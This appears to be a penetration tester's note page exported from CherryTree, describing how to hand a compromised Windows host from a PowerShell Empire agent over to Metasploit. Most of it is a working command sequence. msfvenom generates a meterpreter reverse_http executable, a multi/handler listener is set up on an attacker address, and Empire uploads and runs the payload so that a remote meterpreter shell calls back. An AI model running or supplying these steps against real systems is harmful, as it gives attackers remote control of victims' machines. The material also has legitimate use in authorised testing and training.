<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>switch from Empire to Metasploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>switch from Empire to Metasploit</h1><br/><strong>Powershell Empire Agent active on the target host</strong><br />If we have a Empire Agent on the target host but we want to use a feature available on metasploit<br /><div class="codebox"><pre>root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:/</span># msfvenom <span style="color:#ff9d00;font-weight:400">-</span>p windows<span style="color:#ff9d00;font-weight:400">/</span>meterpreter<span style="color:#ff9d00;font-weight:400">/</span>reverse<span style="color:#ff9d00;font-weight:400">_</span>http LHOST<span style="color:#ff9d00;font-weight:400">=[</span>attackerIP<span style="color:#ff9d00;font-weight:400">]</span> LPORT<span style="color:#ff9d00;font-weight:400">=[</span>attackerPort<span style="color:#ff9d00;font-weight:400">]</span> <span style="color:#ff9d00;font-weight:400">-</span>f exe <span style="color:#ff9d00;font-weight:400">-</span>o <span style="color:#ff9d00;font-weight:400">/</span>tmp<span style="color:#ff9d00;font-weight:400">/</span>metasploit<span style="color:#ff9d00;font-weight:400">.</span>exe<br />root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:/</span># msfconsole<br />msf<span style="color:#ff9d00;font-weight:400">&gt;</span> use multi<span style="color:#ff9d00;font-weight:400">/</span>handler<br />msf<span style="color:#ff9d00;font-weight:400">&gt;</span> set payload windows<span style="color:#ff9d00;font-weight:400">/</span>meterpreter<span style="color:#ff9d00;font-weight:400">/</span>reverse<span style="color:#ff9d00;font-weight:400">_</span>http<br />msf<span style="color:#ff9d00;font-weight:400">&gt;</span> set LHOST <span style="color:#ff0044;font-weight:400">192.168.1.122</span><br />msf<span style="color:#ff9d00;font-weight:400">&gt;</span> set LPORT <span style="color:#ff0044;font-weight:400">7777</span><br />msf<span style="color:#ff9d00;font-weight:400">&gt;</span> exploit<br /><span style="color:#ff9d00;font-weight:400">(</span>Empire<span style="color:#ff9d00;font-weight:400">)&gt;</span> cd <span style="color:#ff9d00;font-weight:400">[</span>destination<span style="color:#ff9d00;font-weight:400">-</span>Path<span style="color:#ff9d00;font-weight:400">-</span>On<span style="color:#ff9d00;font-weight:400">-</span>The<span style="color:#ff9d00;font-weight:400">-</span>Target<span style="color:#ff9d00;font-weight:400">]</span><br /><span style="color:#ff9d00;font-weight:400">(</span>Empire<span style="color:#ff9d00;font-weight:400">)&gt;</span> upload <span style="color:#ff9d00;font-weight:400">/</span>tmp<span style="color:#ff9d00;font-weight:400">/</span>metasploit<span style="color:#ff9d00;font-weight:400">.</span>exe<br /><span style="color:#ff9d00;font-weight:400">(</span>Empire<span style="color:#ff9d00;font-weight:400">)&gt;</span> shell <span style="color:#ff9d00;font-weight:400">[</span>destination<span style="color:#ff9d00;font-weight:400">-</span>Path<span style="color:#ff9d00;font-weight:400">-</span>On<span style="color:#ff9d00;font-weight:400">-</span>The<span style="color:#ff9d00;font-weight:400">-</span>Target<span style="color:#ff9d00;font-weight:400">]/</span>metasploit<span style="color:#ff9d00;font-weight:400">.</span>exe</pre></div><br />    <a href=""><img src="images/1115-1.png" alt="images/1115-1.png" /></a><br />    <a href=""><img src="images/1115-2.png" alt="images/1115-2.png" /></a><br />    <a href=""><img src="images/1115-3.png" alt="images/1115-3.png" /></a><br />    <br />    Now if we come back to the listening handler on Metasploit we should have a meterpreter shell!<br />    <a href=""><img src="images/1115-4.png" alt="images/1115-4.png" /></a></div>
</body>
</html>
